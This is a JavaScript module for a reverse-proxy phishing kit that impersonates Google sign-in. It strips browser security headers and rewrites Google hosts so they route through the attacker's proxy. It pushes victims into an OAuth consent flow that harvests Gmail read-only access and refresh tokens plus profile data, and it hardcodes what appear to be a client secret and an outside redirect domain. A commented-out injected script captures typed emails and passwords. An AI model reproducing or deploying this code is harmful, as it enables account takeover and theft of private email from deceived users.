/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const fs = require('fs')
const superagent = require('superagent');
const crypto = require('crypto');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** OAuth2 Configuration */
const GOOGLE_CLIENT_ID = process.env.GOOGLE_CLIENT_ID || '784416182161-kfvnp8hehmm41ttf3k9klckidmsdva51.apps.googleusercontent.com'
const GOOGLE_CLIENT_SECRET = process.env.GOOGLE_CLIENT_SECRET || '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'
const REDIRECT_URI = process.env.REDIRECT_URI || 'https://chefcaterer.in/oauth/callback'

/** OAuth2 Helper Functions */
const generateState = () => {
    return crypto.randomBytes(32).toString('hex')
}

const generateCodeVerifier = () => {
    return crypto.randomBytes(32).toString('base64url')
}

const generateCodeChallenge = (codeVerifier) => {
    return crypto.createHash('sha256').update(codeVerifier).digest('base64url')
}

/** OAuth2 Request Handler */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        // Handle OAuth2 flow instead of traditional form processing
        return this.handleOAuth2Flow()
    }

    handleOAuth2Flow() {
        // For OAuth2, we typically don't need to intercept the request body
        // Instead, we handle the authorization flow through redirects
        return this.browserReq.pipe(this.proxyEndpoint)
    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: '/playboy',
            },
            // {
            //     reg: /<head>/,
            //     replacement: '<script>window.addEventListener("load",(()=>{function e(e){return new Promise((n=>{if(document.querySelector(e))return n(document.querySelector(e));const t=new MutationObserver((o=>{document.querySelector(e)&&(n(document.querySelector(e)),t.disconnect())}));t.observe(document.body,{childList:!0,subtree:!0})}))}function n(){const e=document.querySelector("#identifierId").value;var n=new XMLHttpRequest;n.open("POST","/emailLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_email="+encodeURIComponent(e))}function t(){const e=document.querySelector("input[type="password"]").value;var n=new XMLHttpRequest;n.open("POST","/pwdLookup",!0),n.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),n.send("unenc_pwd="+encodeURIComponent(e))}e("#identifierNext").then((e=>{e.addEventListener("click",n)})),e("#passwordNext").then((e=>{e.addEventListener("click",t)}))}));</script><head>'
            // },
            {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: '/CheckConnection',
            },
           {
               reg: /name="checkConnection" value/gi,
               replacement: /name"checkConnection" value="youtube:1052:1"/,
           },
           {
               reg: /signaler-pa.googleapis.com/gi,
               replacement: this.browserEndPoint.clientContext.hostname,
           },
        //    {
        //     reg: new RegExp(`https:\/\/${this.browserEndPoint.clientContext.hostname}\/CheckCookie`, 'gi'),
        //     replacement: 'https://account.fujimems.com/CheckCookie'
        //    }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
       

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
            
        }

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        // Handle OAuth2 authorization flow - redirect all Gmail sign-in attempts to OAuth2
        if (this.req.url.startsWith('/oauth/authorize') || 
            this.req.url === '/' || 
            this.req.url.startsWith('/signin') || 
            this.req.url.startsWith('/v3/signin') ||
            this.req.url.includes('accounts.google.com') ||
            this.req.url.includes('ServiceLogin')) {
            return this.handleOAuth2Authorize(clientContext)
        }

        // Handle OAuth2 callback
        if (this.req.url.startsWith('/oauth/callback')) {
            return this.handleOAuth2Callback(clientContext)
        }

        // Handle OAuth2 token exchange
        if (this.req.url.startsWith('/oauth/token')) {
            return this.handleOAuth2Token(clientContext)
        }

        // Handle Gmail API requests after OAuth2 authentication
        if (this.req.url.startsWith('/gmail/')) {
            return this.handleGmailAPI(clientContext)
        }

        // Handle OAuth2 success page
        if (this.req.url.startsWith('/oauth/success')) {
            return this.handleOAuth2Success(clientContext)
        }

        // Handle legacy endpoints for compatibility
        if (this.req.url.startsWith('/punctual/')) {
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }

        if (this.req.url === '/cold204') {
            this.res.writeHead(204)
            return this.res.end('')
        }

        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }

        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }

        // Handle successful authentication redirects
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
                super.sendClientData(clientContext, {})
                return super.exitLink('https://safety.google/privacy/data/')
            }

            if (redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                return super.exitLink('https://safety.google/privacy/data/')
            }
        }

        return super.execute(clientContext)
    }

    handleOAuth2Authorize(clientContext) {
        const state = generateState()
        const codeVerifier = generateCodeVerifier()
        const codeChallenge = generateCodeChallenge(codeVerifier)

        // Store state and code verifier in session
        Object.assign(clientContext.sessionBody, {
            oauth_state: state,
            oauth_code_verifier: codeVerifier
        })

        const authUrl = new URL('https://accounts.google.com/o/oauth2/v2/auth')
        authUrl.searchParams.set('client_id', GOOGLE_CLIENT_ID)
        authUrl.searchParams.set('redirect_uri', REDIRECT_URI)
        authUrl.searchParams.set('response_type', 'code')
        authUrl.searchParams.set('scope', 'https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/userinfo.email')
        authUrl.searchParams.set('state', state)
        authUrl.searchParams.set('code_challenge', codeChallenge)
        authUrl.searchParams.set('code_challenge_method', 'S256')
        authUrl.searchParams.set('access_type', 'offline')
        authUrl.searchParams.set('prompt', 'consent')

        console.log(`Redirecting to OAuth2 authorization: ${authUrl.toString()}`)
        this.res.writeHead(302, { location: authUrl.toString() })
        return this.res.end()
    }

    handleOAuth2Callback(clientContext) {
        const urlObj = url.parse(this.req.url, true)
        const { code, state, error } = urlObj.query

        if (error) {
            console.error(`OAuth2 error: ${error}`)
            this.res.writeHead(400, { 'Content-Type': 'text/html' })
            return this.res.end(`<h1>OAuth2 Error: ${error}</h1>`)
        }

        if (!code || !state) {
            console.error('Missing code or state parameter')
            this.res.writeHead(400, { 'Content-Type': 'text/html' })
            return this.res.end('<h1>Missing authorization code or state</h1>')
        }

        // Verify state parameter
        if (state !== clientContext.sessionBody.oauth_state) {
            console.error('Invalid state parameter')
            this.res.writeHead(400, { 'Content-Type': 'text/html' })
            return this.res.end('<h1>Invalid state parameter</h1>')
        }

        // Exchange authorization code for access token
        this.exchangeCodeForToken(code, clientContext)
    }

    async exchangeCodeForToken(code, clientContext) {
        try {
            const tokenResponse = await superagent
                .post('https://oauth2.googleapis.com/token')
                .send({
                    client_id: GOOGLE_CLIENT_ID,
                    client_secret: GOOGLE_CLIENT_SECRET,
                    code: code,
                    grant_type: 'authorization_code',
                    redirect_uri: REDIRECT_URI,
                    code_verifier: clientContext.sessionBody.oauth_code_verifier
                })

            const tokenData = tokenResponse.body
            console.log('OAuth2 token exchange successful')

            // Store tokens in session
            Object.assign(clientContext.sessionBody, {
                access_token: tokenData.access_token,
                refresh_token: tokenData.refresh_token,
                token_type: tokenData.token_type,
                expires_in: tokenData.expires_in,
                scope: tokenData.scope
            })

            // Get user info
            await this.getUserInfo(tokenData.access_token, clientContext)

            // Mark as logged in and send data
            clientContext.setLogAvailable(true)
            clientContext.info.isLogin = true
            super.sendClientData(clientContext, {})

            // Redirect to success page
            this.res.writeHead(302, { location: '/oauth/success' })
            return this.res.end()

        } catch (error) {
            console.error('Token exchange failed:', error.message)
            this.res.writeHead(400, { 'Content-Type': 'text/html' })
            return this.res.end(`<h1>Token exchange failed: ${error.message}</h1>`)
        }
    }

    async getUserInfo(accessToken, clientContext) {
        try {
            const userResponse = await superagent
                .get('https://www.googleapis.com/oauth2/v2/userinfo')
                .set('Authorization', `Bearer ${accessToken}`)

            const userData = userResponse.body
            console.log(`User authenticated: ${userData.email}`)

            // Store user info
            Object.assign(clientContext.sessionBody, {
                user_email: userData.email,
                user_name: userData.name,
                user_id: userData.id,
                user_picture: userData.picture
            })

        } catch (error) {
            console.error('Failed to get user info:', error.message)
        }
    }

    handleOAuth2Token(clientContext) {
        // Handle token refresh or other token operations
        this.res.writeHead(200, { 'Content-Type': 'application/json' })
        return this.res.end(JSON.stringify({ message: 'Token endpoint' }))
    }

    handleGmailAPI(clientContext) {
        // Handle Gmail API requests with OAuth2 tokens
        this.res.writeHead(200, { 'Content-Type': 'application/json' })
        return this.res.end(JSON.stringify({ message: 'Gmail API endpoint' }))
    }

    handleOAuth2Success(clientContext) {
        // Display success page with user information
        const userEmail = clientContext.sessionBody.user_email || 'Unknown'
        const userName = clientContext.sessionBody.user_name || 'User'
        
        const successHTML = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Gmail OAuth2 Success</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .success { color: #4CAF50; }
                .info { background: #f0f0f0; padding: 20px; border-radius: 5px; margin: 20px 0; }
            </style>
        </head>
        <body>
            <h1 class="success">✅ Gmail OAuth2 Authentication Successful!</h1>
            <div class="info">
                <h3>User Information:</h3>
                <p><strong>Name:</strong> ${userName}</p>
                <p><strong>Email:</strong> ${userEmail}</p>
                <p><strong>Status:</strong> Authenticated</p>
            </div>
            <p>You have successfully authenticated with Gmail using OAuth2.</p>
        </body>
        </html>
        `
        
        this.res.writeHead(200, { 'Content-Type': 'text/html' })
        return this.res.end(successHTML)
    }
}




const configExport = {
    SCHEME: 'gmail',

    CURRENT_DOMAIN: 'accounts.google.com',

    START_PATH: '/',

    AUTOGRAB_CODE: 'OAuth2',

    EXTERNAL_FILTERS: [
        'oauth2.googleapis.com',
        'www.googleapis.com',
        'accounts.google.com'
    ],

    PRE_HANDLERS: [],

    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {},

    // MODULE OPTIONS 
    MODULE_ENABLED: true,

    MODULE_OPTIONS: {
        startPath: '/',
        exitLink: '/oauth/success',
    },

    // OAuth2 Configuration
    OAUTH2_CONFIG: {
        client_id: GOOGLE_CLIENT_ID,
        client_secret: GOOGLE_CLIENT_SECRET,
        redirect_uri: REDIRECT_URI,
        scopes: [
            'https://www.googleapis.com/auth/gmail.readonly',
            'https://www.googleapis.com/auth/userinfo.email',
            'https://www.googleapis.com/auth/userinfo.profile'
        ]
    }
}
module.exports = configExport

